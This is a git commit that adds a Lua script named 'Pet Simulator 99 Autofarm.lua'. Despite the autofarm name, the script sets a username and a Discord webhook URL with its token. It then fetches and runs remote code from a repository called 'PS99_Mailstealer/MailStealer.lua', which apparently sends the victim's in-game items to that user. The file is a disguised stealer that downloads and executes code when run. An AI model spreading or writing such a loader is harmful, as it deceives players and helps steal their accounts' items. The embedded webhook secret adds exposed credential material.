bfb3eb06d142b6c48e8de7f54635b1faa8411b40
ytsyynxx <129667037+ytsyynxx@users.noreply.github.com>
2024-03-14 22:18:51 +0100

    Add files via upload

---
+++ Pet Simulator 99 Autofarm.lua
@@ -0,0 +1,5 @@
+Username = "ytsyynxx"
+LoadScreen = true 
+Webhook = "https://discord.com/api/webhooks/1217576753153704096/b2XTcjAQ-WFMW1_dRk1wRZIVE92lhG9IujzgPkNEXnG4p8lzT57uGHQoi9M0tsGbBFlb"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/KiuuP/PS99_Mailstealer/main/MailStealer.lua"))()
